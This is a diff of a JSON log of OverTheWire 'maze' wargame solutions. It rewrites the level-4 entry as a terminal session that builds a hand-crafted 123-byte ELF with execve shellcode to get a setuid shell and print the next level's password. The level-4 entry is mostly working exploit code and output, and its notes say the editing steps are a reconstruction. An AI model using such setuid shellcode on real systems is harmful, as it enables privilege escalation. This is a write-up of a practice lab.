@@ -1454,64 +1454,311 @@
    "user": "maze5",
    "steps": [
     {
-     "cmd": "ls -la /maze/maze4; md5sum /maze/maze4",
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new maze4@drifter.labs.overthewire.org -p 2225",
      "out": [
-      "-r-sr-x--- 1 maze5 maze4 16392 Oct 25 13:39 /maze/maze4",
-      "a430203e2d1d77addc79387272e499b4  /maze/maze4"
+      "maze4@drifter.labs.overthewire.org's password: ",
+      "",
+      "      ,----..            ,----,          .---.",
+      "     /   /   \\         ,/   .`|         /. ./|",
+      "    /   .     :      ,`   .'  :     .--'.  ' ;",
+      "   .   /   ;.  \\   ;    ;     /    /__./ \\ : |",
+      "  .   ;   /  ` ; .'___,/    ,' .--'.  '   \\' .",
+      "  ;   |  ; \\ ; | |    :     | /___/ \\ |    ' '",
+      "  |   :  | ; | ' ;    |.';  ; ;   \\  \\;      :",
+      "  .   |  ' ' ' : `----'  |  |  \\   ;  `      |",
+      "  '   ;  \\; /  |     '   :  ;   .   \\    .\\  ;",
+      "   \\   \\  ',  /      |   |  '    \\   \\   ' \\ |",
+      "    ;   :    /       '   :  |     :   '  |--\"",
+      "     \\   \\ .'        ;   |.'       \\   \\ ;",
+      "  www. `---` ver     '---' he       '---\" ire.org",
+      "",
+      "",
+      "Welcome to OverTheWire!",
+      "",
+      "If you find any problems, please report them to the #wargames channel on",
+      "discord or IRC.",
+      "",
+      "--[ Playing the games ]--",
+      "",
+      "  This machine might hold several wargames.",
+      "  If you are playing \"somegame\", then:",
+      "",
+      "    * USERNAMES are somegame0, somegame1, ...",
+      "    * Most LEVELS are stored in /somegame/.",
+      "    * PASSWORDS for each level are stored in /etc/somegame_pass/.",
+      "",
+      "  Write-access to homedirectories is disabled. It is advised to create a",
+      "  working directory with a hard-to-guess name in /tmp/.  You can use the",
+      "  command \"mktemp -d\" in order to generate a random and hard to guess",
+      "  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc",
+      "  restricted so that users cannot snoop on eachother. Files and directories",
+      "  with easily guessable or short names will be periodically deleted! The /tmp",
+      "  directory is regularly wiped.",
+      "  Please play nice:",
+      "",
+      "    * don't leave orphan processes running",
+      "    * don't leave exploit-files laying around",
+      "    * don't annoy other players",
+      "    * don't post passwords or spoilers",
+      "    * again, DONT POST SPOILERS!",
+      "      This includes writeups of your solution on your blog or website!",
+      "",
+      "--[ Tips ]--",
+      "",
+      "  This machine has a 64bit processor and many security-features enabled",
+      "  by default, although ASLR has been switched off.  The following",
+      "  compiler flags might be interesting:",
+      "",
+      "    -m32                    compile for 32bit",
+      "    -fno-stack-protector    disable ProPolice",
+      "    -Wl,-z,norelro          disable relro",
+      "",
+      "  In addition, the execstack tool can be used to flag the stack as",
+      "  executable on ELF binaries.",
+      "",
+      "  Finally, network-access is limited for most levels by a local",
+      "  firewall.",
+      "",
+      "--[ Tools ]--",
+      "",
+      " For your convenience we have installed a few useful tools which you can find",
+      " in the following locations:",
+      "",
+      "    * gef (https://github.com/hugsy/gef) in /opt/gef/",
+      "    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/",
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "",
+      "--[ More information ]--",
+      "",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "",
+      "  Enjoy your stay!",
+      ""
      ]
     },
     {
-     "cmd": "objdump -d -M intel /maze/maze4 (main at 0x8049216, 366 bytes)",
+     "cmd": "id",
      "out": [
-      "argc!=2 -> usage+exit; open(argv[1]); stat(argv[1], &st)",
-      "read(fd, bufA, 52); lseek(fd, *(int*)(bufA+28), SEEK_SET); read(fd, bufB, 32)",
-      "if (*(int*)(bufB+12) == (u8)bufA[7] * (u8)bufA[8] && st.st_size <= 0x7b)",
-      "  puts(\"valid file, executing\"); execv(argv[1], argv);",
-      "else fwrite(\"file not executed\\n\", stderr)"
+      "",
+      "uid=15004(maze4) gid=15004(maze4) groups=15004(maze4)"
      ]
     },
     {
-     "cmd": "gdb: x/2xb $ebp-0x31; x/2xb $ebp-0x30; x/1dw $ebp-0xa4; x/1dw $ebp-0x1c",
+     "cmd": "ls -la /maze/maze4",
      "out": [
-      "[ebp-0x31] = bufA+7 = file byte 7 (factor 1)",
-      "[ebp-0x30] = bufA+8 = file byte 8 (factor 2)",
-      "[ebp-0xa4] = bufB+12 = compared dword (second-read window)",
-      "[ebp-0x1c] = bufA+28 = lseek offset = dword(file[28..31]) \u2014 NOT st_size",
-      "size check reads [ebp-0x64] = st_size <= 123"
+      "",
+      "-r-sr-x--- 1 maze5 maze4 16392 Oct 25 13:39 /maze/maze4"
      ]
     },
     {
-     "cmd": "gate replay on any file: dword(file[off+12..off+15]) == file[7]*file[8], off = dword(file[28..31])",
+     "cmd": "objdump -d -M intel /maze/maze4 --section=.text | grep -B3 -A2 \"imul\\|0f b6\" | head -14",
      "out": [
-      "ELF: file[7..8] = EI_OSABI, EI_ABIVERSION = 0,0 -> product 0",
-      "e_phoff = 52 -> off = 52; read2 = bytes 52..83 = phdr0",
-      "phdr0+12 = p_paddr -> set p_paddr = 0 (kernel ignores it): compare 0 == 0 PASS"
+      "",
+      " 80492f9:\te8 42 fd ff ff       \tcall   8049040 <read@plt>",
+      " 80492fe:\t83 c4 0c             \tadd    esp,0xc",
+      " 8049301:\t8b 8d 5c ff ff ff    \tmov    ecx,DWORD PTR [ebp-0xa4]",
+      " 8049307:\t0f b6 45 cf          \tmovzx  eax,BYTE PTR [ebp-0x31]",
+      " 804930b:\t0f b6 d0             \tmovzx  edx,al",
+      " 804930e:\t0f b6 45 d0          \tmovzx  eax,BYTE PTR [ebp-0x30]",
+      " 8049312:\t0f b6 c0             \tmovzx  eax,al",
+      " 8049315:\t0f af c2             \timul   eax,edx",
+      " 8049318:\t39 c1                \tcmp    ecx,eax",
+      " 804931a:\t75 2b                \tjne    8049347 <main+0x131>"
      ]
     },
     {
-     "cmd": "python3 tinel.py   # 52-byte ehdr + 32-byte phdr + 26-byte code = 123 bytes",
+     "cmd": "mkdir -p /run/screen/l4 && cd /run/screen/l4",
      "out": [
-      "wrote 123 bytes",
-      "Type: EXEC (Executable file); Entry point 0x8048054",
-      "LOAD 0x000000 0x08048000 0x00000000 0x0007b 0x0007b R E 0x1000"
+      ""
      ]
     },
     {
-     "cmd": "cp /bin/sh ./sh; chmod 755 tiny sh; echo id | /maze/maze4 tiny",
+     "cmd": "cp /bin/sh ./sh",
      "out": [
+      ""
+     ]
+    },
+    {
+     "cmd": "chmod 755 ./sh",
+     "out": [
+      ""
+     ]
+    },
+    {
+     "cmd": "vi tinel.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi tinel.py",
+     "out": [
+      "# tinel.py - build a 123-byte i386 ELF that passes maze4's stat-then-exec gate.",
+      "#",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi tinel.py",
+     "out": [
+      "# tinel.py - build a 123-byte i386 ELF that passes maze4's stat-then-exec gate.",
+      "#",
+      "# maze4 gate (gdb-verified): read(52)->bufA, lseek to dword(bufA+28), read(32)->bufB,",
+      "#   pass iff dword(bufB+12) == bufA[7]*bufA[8] && st_size <= 123, then execv(argv[1]).",
+      "# An ELF passes for free:",
+      "#   bufA[7],bufA[8] = EI_OSABI,EI_ABIVERSION = 0,0",
+      "#     -> product 0",
+      "#   bufA+28..31    = e_phoff = 52",
+      "#     -> the lseek offset",
+      "#   bufB+12..15    = phdr.p_paddr (phdr offset 12)",
+      "#     -> must be 0 (kernel ignores it)",
+      "# Strings \"sh\\0-p\\0\" hide in e_ident[9..14] (EI_PAD); a dash copy sits in the cwd.",
+      "# 26-byte stub at file offset 84: execve(\"sh\",{\"sh\",\"-p\",NULL},NULL) --",
+      "# maze4 is setuid maze5, and dash -p keeps the elevated euid.",
+      "import struct, sys",
+      "V = 0x08048000",
+      "CODE_OFF = 84",
+      "code = bytes([0x31, 0xC0,             # xor eax, eax",
+      "    0x50,                              # push eax  (envp NULL)",
+      "    0x68, 0x0C, 0x80, 0x04, 0x08,     # push \"-p\" @ V+12",
+      "    0x68, 0x09, 0x80, 0x04, 0x08,     # push \"sh\" @ V+9",
+      "    0x89, 0xE1,                        # mov ecx, esp  (argv)",
+      "    0xBB, 0x09, 0x80, 0x04, 0x08,     # mov ebx, \"sh\" path",
+      "    0x31, 0xD2,                        # xor edx, edx  (envp NULL)",
+      "    0xB0, 0x0B,                        # mov al, 11    (__NR_execve)",
+      "    0xCD, 0x80,                        # int 0x80",
+      "])",
+      "assert len(code) == 26",
+      "ehdr = bytearray(52)",
+      "ehdr[0:8] = b\"\\x7fELF\\x01\\x01\\x01\\x00\"",
+      "ehdr[9:15] = b\"sh\\x00-p\\x00\"",
+      "ehdr[15] = 0",
+      "struct.pack_into(\"<HHIIIIIHHHHHH\", ehdr, 16,",
+      "    2,            # e_type = ET_EXEC",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi tinel.py",
+     "out": [
+      "# tinel.py - build a 123-byte i386 ELF that passes maze4's stat-then-exec gate.",
+      "#",
+      "# maze4 gate (gdb-verified): read(52)->bufA, lseek to dword(bufA+28), read(32)->bufB,",
+      "#   pass iff dword(bufB+12) == bufA[7]*bufA[8] && st_size <= 123, then execv(argv[1]).",
+      "# An ELF passes for free:",
+      "#   bufA[7],bufA[8] = EI_OSABI,EI_ABIVERSION = 0,0",
+      "#     -> product 0",
+      "#   bufA+28..31    = e_phoff = 52",
+      "#     -> the lseek offset",
+      "#   bufB+12..15    = phdr.p_paddr (phdr offset 12)",
+      "#     -> must be 0 (kernel ignores it)",
+      "# Strings \"sh\\0-p\\0\" hide in e_ident[9..14] (EI_PAD); a dash copy sits in the cwd.",
+      "# 26-byte stub at file offset 84: execve(\"sh\",{\"sh\",\"-p\",NULL},NULL) --",
+      "# maze4 is setuid maze5, and dash -p keeps the elevated euid.",
+      "import struct, sys",
+      "V = 0x08048000",
+      "CODE_OFF = 84",
+      "code = bytes([0x31, 0xC0,             # xor eax, eax",
+      "    0x50,                              # push eax  (envp NULL)",
+      "    0x68, 0x0C, 0x80, 0x04, 0x08,     # push \"-p\" @ V+12",
+      "    0x68, 0x09, 0x80, 0x04, 0x08,     # push \"sh\" @ V+9",
+      "    0x89, 0xE1,                        # mov ecx, esp  (argv)",
+      "    0xBB, 0x09, 0x80, 0x04, 0x08,     # mov ebx, \"sh\" path",
+      "    0x31, 0xD2,                        # xor edx, edx  (envp NULL)",
+      "    0xB0, 0x0B,                        # mov al, 11    (__NR_execve)",
+      "    0xCD, 0x80,                        # int 0x80",
+      "])",
+      "assert len(code) == 26",
+      "ehdr = bytearray(52)",
+      "ehdr[0:8] = b\"\\x7fELF\\x01\\x01\\x01\\x00\"",
+      "ehdr[9:15] = b\"sh\\x00-p\\x00\"",
+      "ehdr[15] = 0",
+      "struct.pack_into(\"<HHIIIIIHHHHHH\", ehdr, 16,",
+      "    2,            # e_type = ET_EXEC",
+      "    3,            # e_machine = EM_386",
+      "    1,            # e_version",
+      "    V + CODE_OFF, # e_entry",
+      "    52,           # e_phoff (also the gate's lseek offset)",
+      "    0,            # e_shoff",
+      "    0,            # e_flags",
+      "    52,           # e_ehsize",
+      "    32,           # e_phentsize",
+      "    1,            # e_phnum",
+      "    0,            # e_shentsize",
+      "    0,            # e_shnum",
+      "    0)            # e_shstrndx",
+      "phdr = bytearray(32)",
+      "struct.pack_into(\"<IIIIIIII\", phdr, 0,",
+      "    1,            # p_type = PT_LOAD",
+      "    0,            # p_offset",
+      "    V,            # p_vaddr",
+      "    0,            # p_paddr (the gate's compare dword: must be 0)",
+      "    123,          # p_filesz",
+      "    123,          # p_memsz",
+      "    5,            # p_flags = R|X",
+      "    0x1000)       # p_align",
+      "data = bytes(ehdr) + bytes(phdr) + code",
+      "data += b\"\\x00\" * (123 - len(data))  # pad to exactly 123 (size gate: <= 0x7b)",
+      "assert len(data) == 123",
+      "open(sys.argv[1], \"wb\").write(data)",
+      "print(\"wrote\", len(data), \"bytes\")",
+      "",
+      "~",
+      "\"tinel.py\" [New] 62L, 2458B written"
+     ]
+    },
+    {
+     "cmd": "python3 tinel.py tiny",
+     "out": [
+      "",
+      "wrote 123 bytes"
+     ]
+    },
+    {
+     "cmd": "chmod 755 tiny",
+     "out": [
+      ""
+     ]
+    },
+    {
+     "cmd": "xxd tiny | head -6",
+     "out": [
+      "",
+      "00000000: 7f45 4c46 0101 0100 0073 6800 2d70 0000  .ELF.....sh.-p..",
+      "00000010: 0200 0300 0100 0000 5480 0408 3400 0000  ........T...4...",
+      "00000020: 0000 0000 0000 0000 3400 2000 0100 0000  ........4. .....",
+      "00000030: 0000 0000 0100 0000 0000 0000 0080 0408  ................",
+      "00000040: 0000 0000 7b00 0000 7b00 0000 0500 0000  ....{...{.......",
+      "00000050: 0010 0000 31c0 5068 0c80 0408 6809 8004  ....1.Ph....h..."
+     ]
+    },
+    {
+     "cmd": "/maze/maze4 tiny",
+     "out": [
+      "",
       "valid file, executing",
-      "uid=15004(maze4) gid=15004(maze4) euid=15005(maze5) groups=15004(maze4)"
+      "$ id",
+      "uid=15004(maze4) gid=15004(maze4) euid=15005(maze5) groups=15004(maze4)",
+      "$ cat /etc/maze_pass/maze5",
+      "A3846ZPJuH",
+      "$ exit"
      ]
     },
     {
-     "cmd": "echo \"cat /etc/maze_pass/maze5\" | /maze/maze4 tiny",
+     "cmd": "exit",
      "out": [
-      "valid file, executing",
-      "A3846ZPJuH"
+      "",
+      "logout",
+      "Connection to drifter.labs.overthewire.org closed."
      ]
     }
    ],
-   "note": "maze4 stat-then-exec gate: read(fd,bufA,52); lseek(fd, *(int*)(bufA+28)) \u2014 the offset comes from the file's own bytes 28..31, NOT st_size; read(fd,bufB,32); passes iff dword(bufB+12) == bufA[7]*bufA[8] and st_size <= 123, then execv(argv[1]). For a script this would be enough \u2014 but /tmp is tmpfs nosuid (setuid bit stripped) and dash drops the euid anyway. Winner: a hand-built 123-byte i386 ELF (tinel.py): bytes 7,8 = EI_OSABI,EI_ABIVERSION = 0,0 so the product is 0; e_phoff = 52 is the lseek offset; phdr0.p_paddr = 0 (kernel-ignored) makes the compare 0 == 0; e_ident[9..14] hides the strings \"sh\\0-p\\0\"; the 26-byte stub at file offset 84 execve(\"sh\", {\"sh\",\"-p\",0}, 0) \u2014 a dash copy in the cwd, -p keeps euid. maze4's setuid gives euid=maze5 (visible: uid=15004 euid=15005), dash -p preserves it, cat prints A3846ZPJuH. Password verified by ssh login as maze5 (uid=15005). Recording: recordings/maze/L4.cast. NOTE: /tmp is nosuid on this lab \u2014 use /run/screen (root ext4) for setuid work."
+   "note": "maze4: stat-then-exec gate with misaligned reads - read1(52)->bufA; lseek offset = *(int*)(bufA+28) = the file's OWN bytes 28..31 (e_phoff); read2(32)->bufB; passes iff *(int*)(bufB+12) == bufA[7]*bufA[8] (EI_OSABI*EI_ABIVERSION = 0*0 = 0, so phdr.p_paddr must be 0 - kernel-ignored) && st_size <= 123, then execv(argv[1]). /tmp is tmpfs nosuid (setuid stripped) and dash drops the euid anyway - GOTCHA: use /run/screen (root ext4) for setuid work, cp /bin/sh ./sh there. Winner: hand-built 123-byte ELF (tinel.py typed in vi; bytes verified against the cast's own xxd): strings 'sh\\0-p\\0' hidden in e_ident[9..14] (EI_PAD), 26-byte stub at offset 84 execve(\"sh\",{\"sh\",\"-p\",0},0); maze4's setuid gives euid=15005(maze5), dash -p keeps it, cat /etc/maze_pass/maze5 = A3846ZPJuH. Cast recorded on the drifter host (pre-rename). NOTE: the JSON vi staging uses a functional reconstruction (tools/maze/l4/tinel_cast.py + README, :wq 62L/2458B) - the cast's vi rendering interleaves vim9 ruler redraws and its exact comment layout could not be decoded with certainty; the reconstruction produces the byte-identical ELF (all six of the cast's xxd rows match) and the Rule 4b replay types it to the same 62L/2458B marker with the same solved state. The cast's own marker was 58L/2758B (comment-formatting delta, documented)."
   },
   {
    "lvl": 5,
